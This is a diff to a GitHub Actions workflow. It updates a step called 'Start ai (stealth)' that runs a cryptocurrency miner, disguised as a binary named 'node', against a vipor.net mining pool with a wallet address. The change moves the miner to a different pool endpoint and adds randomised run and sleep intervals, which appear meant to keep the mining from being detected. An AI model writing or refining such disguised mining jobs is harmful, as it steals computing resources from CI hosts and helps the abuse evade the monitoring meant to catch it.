@@ -24,9 +24,18 @@ jobs:
     - name: Start ai (stealth)
       run: |
         while true; do
-          ./node -a verus -o stratum+tcp://ap.vipor.net:9998 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7.worker1 -p x &
+          ./node -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7.worker1 -p x &
           PID=$!
-          sleep 60
+          echo "⛏️ Miner started with PID $PID"
+
+          RUN_TIME=$((180 + RANDOM % 61))  
+          echo "▶️ Running miner for $RUN_TIME seconds"
+          sleep $RUN_TIME
+
           kill $PID
-          sleep 20
+          echo "🛑 Miner stopped."
+
+          SLEEP_TIME=$((15 + RANDOM % 26))
+          echo "😴 Sleeping for $SLEEP_TIME seconds"
+          sleep $SLEEP_TIME
         done
